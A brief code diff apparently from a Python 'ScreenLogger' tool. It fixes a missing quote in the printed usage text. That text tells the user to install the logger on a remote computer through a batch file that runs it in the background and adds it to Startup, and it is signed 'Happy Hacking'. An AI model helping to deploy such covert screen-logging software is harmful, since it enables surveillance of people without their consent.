@@ -14,7 +14,7 @@ print "your ScreenLogger Server will in the the ScreenLogger Folder"
 print "to install to remote computer simply run the Istallation & Run.bat"
 print "it will install the python programming language and modules needed"
 print "for script and automatically Run in background and add the Startup"
-print "folder, Happy Hacking ~NSP
+print "folder, Happy Hacking ~NSP"
 print "\r\n"
 subprocess.call("pause", shell=True)
 
